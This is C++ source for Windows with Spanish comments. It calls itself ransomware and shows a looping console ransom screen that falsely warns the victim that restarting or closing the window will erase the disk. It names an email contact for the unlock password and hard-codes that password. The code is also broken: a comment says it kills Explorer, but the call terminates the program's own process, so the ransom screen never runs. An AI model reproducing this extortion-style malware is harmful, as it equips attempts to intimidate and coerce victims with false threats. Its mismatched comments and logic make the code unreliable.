#include <iostream>
#include <windows.h>
#include <string>

int main() {
  // Cambia el color de la consola a rojo
  SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_INTENSITY);

  // Crea un título para la ventana de la consola
  std::cout << "ESTO ES UN RANSOMWARE" << std::endl;

  // Mata el proceso de Explorador de Windows
  HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, GetCurrentProcessId());
  if (hProcess != NULL) {
    TerminateProcess(hProcess, 0);
    CloseHandle(hProcess);
  }

  // Bucle infinito
  while (true) {
    // Borra la pantalla
    system("cls");

    // Imprime un mensaje de advertencia
    std::cout << "=============================================" << std::endl;
    std::cout << "                LEE CON ATENCION!." << std::endl;
    std::cout << "=============================================" << std::endl;
    std::cout << "NO REINICIAR LA COMPUTADORA!." << std::endl;
    std::cout << "AL REINICAR SE ELIMINARA TODOS LOS DATOS DEL DISCO DURO!" << std::endl;
    std::cout << "SI USTED CIERRA ESTA VENTANA NO PODRA RECUPERAR SU COMPUTADORA!" << std::endl;
    std::cout << "ESCRIBIR A jmgonzalez823@misena.edu.co" << std::endl;
    std::cout << "=============================================" << std::endl;
    std::cout << "Ingresar el password que recibió por correo: ";
    std::string pass;
    std::cin >> pass;

    // Verificar la contraseña
    if (pass == "juanito") {
      // Liberar la víctima
      std::cout << "Felicidades!" << std::endl;
      break;
    } else {
      // Reiniciar el bucle
      continue;
    }
  }

  // Iniciar el Explorador de Windows de manera más confiable
  ShellExecute(NULL, "open", "explorer.exe", NULL, NULL, SW_SHOWNORMAL);

  // Esperar a que el usuario presione una tecla
  std::cin.ignore();
  std::cin.get();

  // Salir del programa
  return 0;
}

